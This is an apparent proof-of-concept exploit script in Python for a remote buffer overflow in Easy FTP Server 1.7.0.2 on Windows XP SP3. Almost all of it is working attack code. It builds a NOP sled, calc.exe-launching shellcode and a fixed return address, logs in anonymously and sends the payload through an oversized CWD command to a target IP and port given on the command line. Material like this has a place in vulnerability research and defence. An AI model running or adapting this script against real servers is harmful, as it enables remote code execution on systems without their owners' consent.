# Tested on: XP SP3 (Eng)
#!/usr/bin/python
import socket, sys

print """
*************************************************
*	Easy FTP Server 1.7.0.2 Remote BoF	*
*	    Discovered by: athleet	 		*
*	jonbutler88[at]googlemail[dot]com	*
*************************************************
"""

if len(sys.argv) != 3:
	print "Usage: ./easyftp.py <Target IP> <Port>"
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

# Calc.exe PoC shellcode - Tested on XP Pro SP3 (Eng)
#
# B *0X009AFE44
#
shellcode = (
"\xba\x20\xf0\xfd\x7f" # 			MOV EDX,7FFDF020
"\xc7\x02\x4c\xaa\xf8\x77" # 		MOV DWORD PTR DS:[EDX],77F8AA4C
"\x33\xC0" # 						XOR EAX,EAX
"\x50" # 							PUSH EAX
"\x68\x63\x61\x6C\x63" #			PUSH 636C6163
"\x54" #							PUSH ESP
"\x5B" #							POP EBX
"\x50" #							PUSH EAX
"\x53" #							PUSH EBX
"\xB9\xC7\x93\xC2\x77" #			MOV ECX,77C293C7
"\xFF\xD1" #						CALL ECX
"\xEB\xF7" #						JMP SHORT 009AFE5B
)

nopsled = "\x90" * (268 - len(shellcode))

ret = "\x58\xFD\x9A\x00"

payload = nopsled + shellcode + ret # 272 bytes

print "[+] Launching exploit against " + target + "..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	connect=s.connect((target, port))
	print "[+] Connected!"
except:
	print "[!] Connection failed!"
	sys.exit(0)
s.recv(1024) 
s.send('USER anonymous\r\n') 
s.recv(1024) 
s.send('PASS anonymous\r\n') 
s.recv(1024)
# Send payload...
print "[+] Sending payload..."
s.send('CWD ' + payload + '\r\n') 
try:
	s.recv(1024)
	print "[!] Exploit failed..."
except:
	print "[+] Exploited ^_^"